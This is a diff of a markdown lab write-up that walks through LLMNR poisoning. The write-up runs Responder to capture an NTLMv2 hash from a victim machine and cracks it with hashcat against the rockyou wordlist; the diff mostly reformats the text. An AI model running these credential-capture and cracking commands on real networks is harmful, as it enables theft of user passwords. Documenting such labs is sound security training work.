@@ -60,6 +60,7 @@ Victim                    Network                         Attacker
 ```
 
 ## Lab Setup
+
 ```
 |   Component  |        Details          |
 |--------------|-------------------------|
@@ -81,14 +82,15 @@ Before starting Responder, I first identified my network interface name and IP a
 ```bash
 ip a
 ```
-<p align="center">
-  <img src="/Active-Directory/01-llmnr-poisoning/images/step1.png" width="600">
-</p>
 
-## Output:
+**Output:**
+
 ```
 eth0: 192.168.5.128
 ```
+<p align="center">
+  <img src="/Active-Directory/01-llmnr-poisoning/images/step1.png" width="600">
+</p>
 
 ## Step 2 — Start Responder
 
@@ -97,6 +99,7 @@ After identifying my network interface, I launched Responder to listen for LLMNR
 ```bash
 sudo responder -I eth0 -dwv
 ```
+
 ```
 |    Flag   |     Meaning       |
 |-----------|-------------------|
@@ -105,6 +108,7 @@ sudo responder -I eth0 -dwv
 |    -w     | WPAD proxy server |
 |    -v     | Verbose mode      |
 ```
+
 Responder will now listen on the network and wait for someone to broadcast a name request.
 
 <p align="center">
@@ -114,9 +118,11 @@ Responder will now listen on the network and wait for someone to broadcast a nam
 ## Step 3 — Trigger from Victim Machine
 
 On the victim machine, I opened File Explorer and typed:
+
 ```
 \\fakeshare
 ```
+
 Since fakeshare does not exist, Windows could not find it through DNS and sent an LLMNR request on the network.
 
 In my lab, the victim machine name was VICTIM-2.
@@ -151,13 +157,14 @@ First, I copied the NTLMv2 hash captured by Responder.
   <img src="/Active-Directory/01-llmnr-poisoning/images/step4-1.png" width="600">
 </p>
 
-- step 4.2: Create a File for the Hash
+#### Create a File for the Hash
 
 On my Kali machine, I created a new file using Nano:
 
 ```bash
 nano hash.txt
 ```
+
 #### Open the File
 
 After running the command, I pressed Enter to open the file.
@@ -183,6 +190,7 @@ Ctrl + X
 Y
 Enter
 ```
+
 This saved the hash to hash.txt, which I used in the next step for password cracking.
 
 ## Step 5 — Crack the Captured Hash
@@ -202,16 +210,17 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 | /usr/share/wordlists/rockyou.txt | Wordlist used for dictionary attack (rockyou) |
 ```
 
-## Result:
+**Output:**
 
 After a short time, Hashcat successfully cracked the password and displayed the result:
+
 ```
 KARIM::VICTIM-2:08c4e1b5073681c1:7acce8f5708e0b1ea3bcbcf99f26fa01:10101000000000011
 0003050242c6fd:01ea99382479946200308001004c0000000200040043004600310035003900300000
 10004004600310035003900300000000300240043004600310035003900300001000000040000000500
 93003000300000000600040002000000070008000051d384c007d90100000000800304380000000c002
 0ba8403001095010095047805a003002ea80c4f04b38041804ac00700805506242c6fdc010600802000
-0000050006002000000000800045005300350033004a0083003......(full hash).....:Password                                                                                    
+0000050006002000000000800045005300350033004a0083003......(full hash).....:Password1                                                                                    
 ```
 ### Cracked Password
 
